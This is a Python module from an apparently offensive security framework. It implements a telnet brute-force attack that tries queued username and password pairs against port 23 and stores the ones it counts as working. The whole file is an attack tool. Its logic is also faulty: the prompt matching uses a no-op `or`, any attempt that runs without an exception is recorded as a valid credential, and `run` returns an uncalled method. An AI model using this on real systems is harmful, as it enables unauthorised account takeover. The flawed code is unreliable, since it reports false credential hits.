from jframework.modules.login._bruteforce import _Bruteforce
import sys
import telnetlib


class Telnetbruteforce(_Bruteforce):

    def __init__(self):
        super(Telnetbruteforce, self).__init__()
        self.single_port = 23

    def worker(self):
        while(not self.tasks_queue.empty()):
            task = self.tasks_queue.get()
            if task is None:
                break
            try:
                tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=2)
                tn.read_until((b"login: " or b"Login: " ))
                tn.write(task["user"].encode("ascii") + b"\n")
                tn.read_until((b"Password: " or b"password: "))
                tn.write(task["password"].encode("ascii") + b"\n")
                tn.write(b"dir\n")
                tn.write(b"exit\n")
                tn.read_all()
                tn.close()
                self.print_result(task["user"], task["password"], error=False)
                self.add_credential(task["user"], task["password"], "telnet")
            except:
                if (self.verb):
                    self.print_result(task["user"], task["password"], error=True)
                try:
                    tn.close()
                except:
                    pass

            self.tasks_queue.task_done()

    def run(self):
        try:
            tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=3)
            resp = tn.expect([b"login: ", b"Login: "], 3)
            tn.close()
            if resp[1] is None:
                raise Exception
        except Exception as e:
            if("timed out" in str(e)):
                print("No service found")
            else:
                print("It doesn't work with that kind of telnet")
            return None, None

        return super(Telnetbruteforce, self).run